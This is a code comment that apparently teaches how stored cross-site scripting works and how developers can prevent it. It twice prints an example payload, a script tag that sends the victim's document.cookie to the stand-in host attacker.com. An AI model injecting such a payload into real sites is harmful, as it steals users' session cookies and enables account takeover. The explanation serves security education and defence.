/*
    Stored XSS Attack - How It Works and How a User Becomes a Victim (user generated content)

    1. Attacker Injects Malicious Script
       - In a Stored XSS attack, the attacker finds a form on a website where they can input data that gets stored on the server.
       - The attacker injects a malicious script into a form field (e.g., comments, profile updates, or messages).

       Example of a malicious script:
       <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>

    2. Malicious Script Gets Stored on the Server
       - The website stores the attacker’s input (the script) in a database or some other storage.
       - Every time the stored data is retrieved (e.g., a comment section or user profile), the script is reflected in the webpage.

    3. Victim Views the Malicious Content
       - When another user (or even the attacker themselves) views the page, the malicious script is executed automatically in their browser.
       - This is because the website blindly displays the stored data, including the malicious script.

    4. What Happens When the Script Runs
       - Once the victim’s browser executes the script, it could perform various harmful actions:
         a) **Stealing Cookies**: The script could steal session cookies using `document.cookie` and send them to the attacker’s server.
         b) **Keylogging**: The script could capture keystrokes to steal login credentials.
         c) **Redirecting the User**: The script could redirect the user to a malicious website.

    Example of a Malicious Script in Action:
    - Attacker submits this as a comment:
      <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
    - The comment is stored in the database.
    - When the victim views the comment, the script runs, stealing their session cookie and sending it to the attacker’s server.

    5. Result - Persistent Attack
       - Unlike Reflected XSS, where the attack is only triggered when the user clicks a malicious link, in Stored XSS, the attack is persistent.
       - Every time a victim views the stored data, the malicious script is executed, making this attack more dangerous as it affects many users.

    Summary:
    - The attacker injects a malicious script into a form that stores data (e.g., comments, profiles).
    - The website stores this input without sanitizing it.
    - The malicious script runs whenever any user views the stored content.
    - The script can steal data, redirect users, or perform other harmful actions.

    Prevention Tips for Users:
    - Be cautious when using websites where users can submit content (e.g., comment sections).
    - Avoid interacting with suspicious user-generated content on websites.
    - Use browser extensions to block malicious scripts.
    
    ---------------------------------------------------

    Preventive Measures for Developers:

    1. Sanitize all input:
       - Ensure that any user input, especially content that is stored and later reflected, is properly sanitized. Escape characters like <, >, &, and ".

    2. Output Encoding:
       - Always encode output before displaying it to users. For example, convert special characters to HTML entities (e.g., `<` becomes `&lt;`).

    3. Content Security Policy (CSP):
       - Implement a strict CSP that prevents inline JavaScript execution and restricts where scripts can be loaded from. This can mitigate the impact of XSS.

    4. Input Validation:
       - Validate user inputs on both the client and server sides to ensure they follow expected formats and constraints.

    5. HTTPOnly and Secure Cookies:
       - Use the `HttpOnly` flag to prevent JavaScript from accessing session cookies.
       - The `Secure` flag ensures cookies are only transmitted over HTTPS.

    6. SameSite Cookies:
       - Use the `SameSite` attribute for cookies to prevent them from being sent in cross-site requests, reducing the risk of session hijacking via XSS.

    7. Regular Security Audits:
       - Regularly test your application for XSS vulnerabilities using automated tools and manual code reviews.
*/
